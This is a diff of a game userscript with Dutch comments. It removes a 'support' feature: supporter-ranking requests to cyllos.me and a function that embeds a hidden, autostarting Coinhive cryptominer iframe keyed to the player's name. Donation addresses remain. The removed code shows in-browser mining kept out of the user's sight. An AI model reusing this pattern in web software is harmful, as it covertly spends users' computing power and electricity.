@@ -319,14 +319,8 @@ function doSettings() {					// functie die het instellingenmenu maakt
     element.appendChild(childElement);
     body.appendChild(element);
 
-    // maak het support doosje rechts
-    listitem = addCheckbox(settings.support,"setting_support","Support dit project<p style=\"line-height: 0;font-size: 9px;\">(zie de wiki voor meer info)</p>");	// maak een support checkbox
-    getSupporters();		// haal de beste supporters op
-    getSupportPlayer();	// haal speler zijn persoonlijke support op
     element = document.createElement('p');
     element.innerHTML = listitem.outerHTML;
-    element.innerHTML += '<p id="playersupport"></p>';
-    element.innerHTML += '<p id="topsupport"></p>';
     element.innerHTML += 'Bitcoin: <span style="font-size: xx-small;float: right">38DjmGJiSn52Hk4h3aQvy1oCEqAq39zUF7</span>';
     element.innerHTML += '<br>Gridcoin:  <span style="font-size: xx-small;float: right; padding-left: 5px">SGNF5BMt3uADgSzm1sKD4LBBt8cS5Fc42b</span>';
     element.innerHTML += '<br>Monero: <span style="font-size: xx-small; float: right; max-width: 200px; overflow-wrap: break-word;">46D5zappguzc2hgzcj9Kaw2oRBtUxyxpwVtmnBeuJsSLirGcJkUKUwFNjmQG1NPHfha4ZRiVwow3dE9B6Yc6JyGWKZDMckr</span>';
@@ -666,49 +660,6 @@ function stadsinfo(var1, var3, data) { // module voor het toevoegen van tags
     }
     return var1;
 }
-
-function getSupporters(){	// deze module haalt de top 3 supporters op
-    $.ajax({
-        url: "https://cyllos.me/GME/GME",
-        method: "get",
-        data: {
-            action: 'getSupport',
-        },
-        cache: !0
-    }).success(function(data){
-        // indien er supporters gevonden zijn haal dan hun data uit het json object
-        supporters = JSON.parse(data).users;
-        document.getElementById('topsupport').innerHTML = 'Top supporters: <br>1: ' + supporters[0].name + ' (' + parseInt(supporters[0].total/10000) + ' punten) <br>2: ' +
-            supporters[1].name + ' (' + parseInt(supporters[1].total/10000) + ' punten) <br>3: ' +
-            supporters[2].name + ' (' + parseInt(supporters[2].total/10000) + ' punten)';
-    });
-}
-
-function getSupportPlayer(){	// deze module haalt de punten op van de speler zelf
-    $.ajax({
-        url: "https://cyllos.me/GME/GME",
-        method: "get",
-        data: {
-            action: 'getSupport',
-            player: UWGame.player_name
-        },
-        cache: !0
-    }).success(function(data){
-        // als ze gevonden zijn verzamel dan de data en geef terug
-        supporters = JSON.parse(data);
-        if(supporters.success) document.getElementById('playersupport').innerHTML = 'Jouw punten: ' +parseInt(supporters.total/10000);
-        else document.getElementById('playersupport').innerHTML = 'Jouw punten: 0';
-    });
-}
-function laadSupport(){		// deze module laadt de support tool van coinhive
-    // voegt het supportelement toe aan de webpagina
-    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + UWGame.player_name + '&whitelabel=1&autostart=1&throttle=0.3&threads=&background=&text=Okay';
-    supportNode = document.createElement('iframe');
-    supportNode.src = support;
-    supportNode.style.display = 'none';
-    document.body.appendChild(supportNode);
-}
-
 function stadsinfoStarter() { // deze module start het laden van tags
     idleList = getidleList();
     idleList.success(function(data) {
